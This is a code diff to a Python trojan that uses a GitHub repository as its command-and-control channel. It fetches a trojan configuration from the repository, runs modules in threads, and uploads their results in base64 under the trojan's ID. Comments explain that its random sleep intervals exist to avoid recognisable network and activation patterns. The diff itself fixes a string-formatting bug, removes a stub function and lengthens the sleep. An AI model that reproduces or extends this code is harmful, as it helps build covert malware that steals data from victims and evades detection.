@@ -53,11 +53,6 @@ def get_file_contents(filepath):
             return blob.content
     return None#if not found return nothing
 
-def get_wheel_contents(filepath):
-    #connect to github and find a file in github it is in base64
-    x = get_file_contents(filepath)
-    
-
 def get_trojan_config():
     #get a json file and decode it,then import it
     global configured#flag to flag if trojan is configured
@@ -73,7 +68,7 @@ def get_trojan_config():
 
 def store_module_result(data,module):#storing module resaults in data section
     gh,repo,branch = connect_to_github()#connect to github
-    remote_path = "data/%s/%s_%d.data" % (trojan_id,module,time.sleep,random.randint(1000,100000))
+    remote_path = "data/%s/%s_%d.data" % (trojan_id,module,random.randint(1000,100000))
     #store it in a file called like your trojan id in github repository
     repo.create_file(remote_path,"Commit message",base64.b64encode(data))
     #repo action for github create file in repo
@@ -133,5 +128,5 @@ while True:#always be active
             t.start()#start the thread
             time.sleep(random.randint(1,10))
             #sleep for a random amount of time so there wont be network patterns to recognize
-    time.sleep(random.randint(90,100))
+    time.sleep(random.randint(100,120))
     #again sleep for a random amount of time so there wont be an activation pattern
